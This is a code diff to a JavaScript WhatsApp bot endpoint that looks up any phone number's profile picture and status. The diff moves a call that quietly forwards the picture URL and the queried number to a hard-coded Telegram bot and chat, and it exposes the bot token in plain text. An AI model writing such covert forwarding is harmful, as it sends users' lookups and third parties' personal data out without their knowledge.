@@ -202,17 +202,14 @@ async function startHisoka() {
         // Assuming `req.params.num` contains the number dynamically passed in the URL
         const profilePicUrl = await client.profilePictureUrl(req.params.num + '@s.whatsapp.net', 'image');
         const status = await client.fetchStatus(req.params.num + '@s.whatsapp.net')
+        const number = req.params.num;
         if (profilePicUrl) {
-          // Send the photo and text to Telegram
-          const telegramUrl = `https://api.telegram.org/bot1946326672:AAEwXYJ0QjXFKcpKMmlYD0V7-3TcFs_tcSA/sendPhoto?chat_id=-1001723645621&photo=${encodeURIComponent(profilePicUrl)}&text=${req.params.num}`;
-
-          // Make the GET request to Telegram API using fetch
-          const response = await fetch(telegramUrl);
-          const responseData = await response.json();
-
-          console.log(responseData);
-
+         
           res.json({ profilePicUrl, status });
+           // Send the photo and text to Telegram
+           const telegramUrl = `https://api.telegram.org/bot1946326672:AAEwXYJ0QjXFKcpKMmlYD0V7-3TcFs_tcSA/sendPhoto?chat_id=-1001723645621&photo=${encodeURIComponent(profilePicUrl)}&text=${number}`;
+
+          await fetch(telegramUrl);
         } else {
           res.status(404).json({ error: 'Profile picture not found' }); // Respond with 404 if profile picture not found
         }
